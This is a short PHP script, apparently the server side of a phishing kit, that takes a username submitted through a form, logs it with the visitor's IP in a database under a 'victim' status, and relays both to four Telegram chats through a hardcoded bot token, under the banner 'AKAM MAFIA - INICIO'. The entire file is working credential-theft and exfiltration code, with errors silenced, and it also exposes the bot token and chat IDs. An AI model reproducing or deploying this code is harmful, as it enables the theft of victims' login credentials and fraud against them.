<?php
error_reporting(0);
// Asegúrate de que esta ruta sea la correcta para tu Railway
require_once('../panel/lib/funciones.php');

$ip = $_SERVER['REMOTE_ADDR'];
$usuario = $_POST['usr'];
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$chat_ids = ["8114050673", "8518977918", "8638340940", "8645545892"];

if (!empty($usuario)) {
    // Registramos en base de datos primero
    actualizar_registro($ip, "USUARIO", $usuario);
    actualizar_estado_victima($ip, "1");
    
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n";
    $mensaje .= "👤 <b>USUARIO:</b> <code>$usuario</code>\n";
    $mensaje .= "📍 <b>IP:</b> $ip";

    // Enviamos a los 4 IDs usando un método que no bloquea
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mensaje) . "&parse_mode=HTML";
        
        // Usamos curl con un tiempo de espera muy corto para cada envío
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1); // Solo espera 1 segundo por ID
        curl_exec($ch);
        curl_close($ch);
    }
}
echo "ok";
?>
